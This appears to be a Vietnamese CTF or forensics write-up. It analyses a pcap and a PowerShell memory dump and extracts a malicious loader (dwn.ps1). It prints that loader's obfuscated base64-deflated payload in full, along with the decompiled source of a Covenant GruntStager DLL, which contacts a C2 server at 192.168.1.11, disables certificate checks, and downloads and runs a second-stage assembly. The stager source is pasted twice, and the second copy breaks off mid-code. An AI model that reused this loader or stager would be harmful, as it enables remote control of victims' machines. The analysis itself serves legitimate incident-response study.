Sau khi tải file về đề cung cấp cho mình 2 file , 1 file là pcap 1 file là memory dump của powershell

<img width="1155" height="382" alt="image" src="https://github.com/user-attachments/assets/b71127ae-0ee2-4065-996d-0d947f5566a0" />

Mở file pcap bằng wirshark trích được con malware là dwn.ps1 và byp.ps1 , con byp có tác dụng bypass windows defenders,Và đây là mã nguồn của dwn.ps1:

```
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
GET /en-us/test.html HTTP/1.1
```
Chuỗi payload bên trong đã bị mã hóa base 64 và Raw Inflate , decode trên cyberchef ta thu được dấu hiệu của "This program cannot be run in DOS mode" , đây là dấu hiệu của 1 file pe , tiến hành lưu file là payload.dll, file dll viết bằng C# dùng DnSpy để decompiler và đọc mã nguồn:

Mã nguồn của malware:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;

namespace GruntStager
{
    // Token: 0x02000002 RID: 2
    public class GruntStager
    {
        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
        public GruntStager()
        {
            this.ExecuteStager();
        }

        // Token: 0x06000002 RID: 2 RVA: 0x0000205E File Offset: 0x0000025E
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }

        // Token: 0x06000003 RID: 3 RVA: 0x0000205E File Offset: 0x0000025E
        public static void Execute()
        {
            new GruntStager();
        }

        // Token: 0x06000004 RID: 4 RVA: 0x00002068 File Offset: 0x00000268
        public void ExecuteStager()
        {
            try
            {
                List<string> list = "http://192.168.1.11:80".Split(new char[]
                {
                    ','
                }).ToList<string>();
                string CovenantCertHash = "";
                List<string> list2 = (from H in "VXNlci1BZ2VudA==,Q29va2ll".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
                List<string> list3 = (from H in "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
                List<string> list4 = (from U in "L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList<string>();
                string format = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
                string format2 = "<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse("false");
                bool UseCertPinning = bool.Parse("false");
                Random random = new Random();
                string str = "69ebf9edc5";
                string text = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] key = Convert.FromBase64String("e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw=");
                string format3 = "{{\"GUID\":\"{0}\",\"Type\":{1},\"Meta\":\"{2}\",\"IV\":\"{3}\",\"EncryptedMessage\":\"{4}\",\"HMAC\":\"{5}\"}}";
                Aes aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.GenerateIV();
                HMACSHA256 hmacsha = new HMACSHA256(key);
                RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
                byte[] bytes = Encoding.UTF8.GetBytes(rsacryptoServiceProvider.ToXmlString(false));
                byte[] array = aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
                byte[] inArray = hmacsha.ComputeHash(array);
                string s = string.Format(format3, new object[]
                {
                    str + text,
                    "0",
                    "",
                    Convert.ToBase64String(aes.IV),
                    Convert.ToBase64String(array),
                    Convert.ToBase64String(inArray)
                });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
                ServicePointManager.ServerCertificateValidationCallback = delegate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
                {
                    bool flag = true;
                    if (UseCertPinning && CovenantCertHash != "")
                    {
                        flag = (cert.GetCertHashString() == CovenantCertHash);
                    }
                    if (flag & ValidateCert)
                    {
                        flag = (errors == SslPolicyErrors.None);
                    }
                    return flag;
                };
                string arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s));
                GruntStager.CookieWebClient cookieWebClient = null;
                cookieWebClient = new GruntStager.CookieWebClient();
                cookieWebClient.UseDefaultCredentials = true;
                cookieWebClient.Proxy = WebRequest.DefaultWebProxy;
                cookieWebClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string text2 = "";
                foreach (string text3 in list)
                {
                    try
                    {
                        for (int i = 0; i < list3.Count; i++)
                        {
                            if (list2[i] == "Cookie")
                            {
                                cookieWebClient.SetCookies(new Uri(text3), list3[i].Replace(";", ",").Replace("{GUID}", ""));
                            }
                            else
                            {
                                cookieWebClient.Headers.Set(list2[i].Replace("{GUID}", ""), list3[i].Replace("{GUID}", ""));
                            }
                        }
                        cookieWebClient.DownloadString(text3 + list4[random.Next(list4.Count)].Replace("{GUID}", ""));
                        text2 = text3;
                    }
                    catch
                    {
                    }
                }
                for (int j = 0; j < list3.Count; j++)
                {
                    if (list2[j] == "Cookie")
                    {
                        cookieWebClient.SetCookies(new Uri(text2), list3[j].Replace(";", ",").Replace("{GUID}", text));
                    }
                    else
                    {
                        cookieWebClient.Headers.Set(list2[j].Replace("{GUID}", text), list3[j].Replace("{GUID}", text));
                    }
                }
                string text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                List<string> list5 = GruntStager.Parse(text4, format3);
                string s2 = list5[3];
                string s3 = list5[4];
                string a = list5[5];
                byte[] array2 = Convert.FromBase64String(s3);
                if (!(a != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                {
                    aes.IV = Convert.FromBase64String(s2);
                    byte[] rgb = aes.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
                    byte[] key2 = rsacryptoServiceProvider.Decrypt(rgb, true);
                    Aes aes2 = Aes.Create();
                    aes2.Mode = CipherMode.CBC;
                    aes2.Padding = PaddingMode.PKCS7;
                    aes2.Key = key2;
                    aes2.GenerateIV();
                    hmacsha = new HMACSHA256(aes2.Key);
                    byte[] array3 = new byte[4];
                    RandomNumberGenerator.Create().GetBytes(array3);
                    byte[] array4 = aes2.CreateEncryptor().TransformFinalBlock(array3, 0, array3.Length);
                    inArray = hmacsha.ComputeHash(array4);
                    string s4 = string.Format(format3, new object[]
                    {
                        text,
                        "1",
                        "",
                        Convert.ToBase64String(aes2.IV),
                        Convert.ToBase64String(array4),
                        Convert.ToBase64String(inArray)
                    });
                    arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s4));
                    for (int k = 0; k < list3.Count; k++)
                    {
                        if (list2[k] == "Cookie")
                        {
                            cookieWebClient.SetCookies(new Uri(text2), list3[k].Replace(";", ",").Replace("{GUID}", text));
                        }
                        else
                        {
                            cookieWebClient.Headers.Set(list2[k].Replace("{GUID}", text), list3[k].Replace("{GUID}", text));
                        }
                    }
                    text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                    text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                    List<string> list6 = GruntStager.Parse(text4, format3);
                    s2 = list6[3];
                    s3 = list6[4];
                    string a2 = list6[5];
                    array2 = Convert.FromBase64String(s3);
                    if (!(a2 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                    {
                        aes2.IV = Convert.FromBase64String(s2);
                        byte[] src = aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
                        byte[] array5 = new byte[4];
                        byte[] array6 = new byte[4];
                        Buffer.BlockCopy(src, 0, array5, 0, 4);
                        Buffer.BlockCopy(src, 4, array6, 0, 4);
                        if (!(Convert.ToBase64String(array3) != Convert.ToBase64String(array5)))
                        {
                            aes2.GenerateIV();
                            byte[] array7 = aes2.CreateEncryptor().TransformFinalBlock(array6, 0, array6.Length);
                            inArray = hmacsha.ComputeHash(array7);
                            string s5 = string.Format(format3, new object[]
                            {
                                text,
                                "2",
                                "",
                                Convert.ToBase64String(aes2.IV),
                                Convert.ToBase64String(array7),
                                Convert.ToBase64String(inArray)
                            });
                            arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s5));
                            for (int l = 0; l < list3.Count; l++)
                            {
                                if (list2[l] == "Cookie")
                                {
                                    cookieWebClient.SetCookies(new Uri(text2), list3[l].Replace(";", ",").Replace("{GUID}", text));
                                }
                                else
                                {
                                    cookieWebClient.Headers.Set(list2[l].Replace("{GUID}", text), list3[l].Replace("{GUID}", text));
                                }
                            }
                            text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                            text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                            List<string> list7 = GruntStager.Parse(text4, format3);
                            s2 = list7[3];
                            s3 = list7[4];
                            string a3 = list7[5];
                            array2 = Convert.FromBase64String(s3);
                            if (!(a3 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                            {
                                aes2.IV = Convert.FromBase64String(s2);
                                Assembly.Load(aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length)).GetTypes()[0].GetMethods()[0].Invoke(null, new object[]
                                {
                                    text2,
                                    CovenantCertHash,
                                    text,
                                    aes2
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message + Environment.NewLine + ex.StackTrace);
            }
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002A78 File Offset: 0x00000C78
        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}"))
            {
                format = format.Replace("{0}", "(?'group0'.*)");
            }
            if (format.Contains("{1}"))
            {
                format = format.Replace("{1}", "(?'group1'.*)");
            }
            if (format.Contains("{2}"))
            {
                format = format.Replace("{2}", "(?'group2'.*)");
            }
            if (format.Contains("{3}"))
            {
                format = format.Replace("{3}", "(?'group3'.*)");
            }
            if (format.Contains("{4}"))
            {
                format = format.Replace("{4}", "(?'group4'.*)");
            }
            if (format.Contains("{5}"))
            {
                format = format.Replace("{5}", "(?'group5'.*)");
            }
            Match match = new Regex(format).Match(data);
            List<string> list = new List<string>();
            if (match.Groups["group0"] != null)
            {
                list.Add(match.Groups["group0"].Value);
            }
            if (match.Groups["group1"] != null)
            {
                list.Add(match.Groups["group1"].Value);
            }
            if (match.Groups["group2"] != null)
            {
                list.Add(match.Groups["group2"].Value);
            }
            if (match.Groups["group3"] != null)
            {
                list.Add(match.Groups["group3"].Value);
            }
            if (match.Groups["group4"] != null)
            {
                list.Add(match.Groups["group4"].Value);
            }
            if (match.Groups["group5"] != null)
            {
                list.Add(match.Groups["group5"].Value);
            }
            return list;
        }

        // Token: 0x02000003 RID: 3
        public class CookieWebClient : WebClient
        {
            // Token: 0x17000001 RID: 1
            // (get) Token: 0x06000006 RID: 6 RVA: 0x00002C96 File Offset: 0x00000E96
            // (set) Token: 0x06000007 RID: 7 RVA: 0x00002C9E File Offset: 0x00000E9E
            public CookieContainer CookieContainer { get; private set; }

            // Token: 0x06000008 RID: 8 RVA: 0x00002CA7 File Offset: 0x00000EA7
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }

            // Token: 0x06000009 RID: 9 RVA: 0x00002CBA File Offset: 0x00000EBA
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }

            // Token: 0x0600000A RID: 10 RVA: 0x00002CCC File Offset: 0x00000ECC
            protected override WebRequest GetWebRequest(Uri address)
            {
                HttpWebRequest httpWebRequest = base.GetWebRequest(address) as HttpWebRequest;
                if (httpWebRequest == null)
                {
                    return base.GetWebRequest(address);
                }
                httpWebRequest.CookieContainer = this.CookieContainer;
                return httpWebRequest;
            }
        }

        // Token: 0x02000004 RID: 4
        public static class MessageTransform
        {
            // Token: 0x0600000B RID: 11 RVA: 0x00002CFE File Offset: 0x00000EFE
            public static string Transform(byte[] bytes)
            {
                return Convert.ToBase64String(bytes);
            }

            // Token: 0x0600000C RID: 12 RVA: 0x00002D06 File Offset: 0x00000F06
            public static byte[] Invert(string str)
            {
                return Convert.FromBase64String(str);
            }
        }
    }
}using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;

namespace GruntStager
{
    // Token: 0x02000002 RID: 2
    public class GruntStager
    {
        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
        public GruntStager()
        {
            this.ExecuteStager();
        }

        // Token: 0x06000002 RID: 2 RVA: 0x0000205E File Offset: 0x0000025E
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }

        // Token: 0x06000003 RID: 3 RVA: 0x0000205E File Offset: 0x0000025E
        public static void Execute()
        {
            new GruntStager();
        }

        // Token: 0x06000004 RID: 4 RVA: 0x00002068 File Offset: 0x00000268
        public void ExecuteStager()
        {
            try
            {
                List<string> list = "http://192.168.1.11:80".Split(new char[]
                {
                    ','
                }).ToList<string>();
                string CovenantCertHash = "";
                List<string> list2 = (from H in "VXNlci1BZ2VudA==,Q29va2ll".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
                List<string> list3 = (from H in "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
                List<string> list4 = (from U in "L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(new char[]
                {
                    ','
                }).ToList<string>()
                select Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList<string>();
                string format = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
                string format2 = "<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse("false");
                bool UseCertPinning = bool.Parse("false");
                Random random = new Random();
                string str = "69ebf9edc5";
                string text = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] key = Convert.FromBase64String("e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw=");
                string format3 = "{{\"GUID\":\"{0}\",\"Type\":{1},\"Meta\":\"{2}\",\"IV\":\"{3}\",\"EncryptedMessage\":\"{4}\",\"HMAC\":\"{5}\"}}";
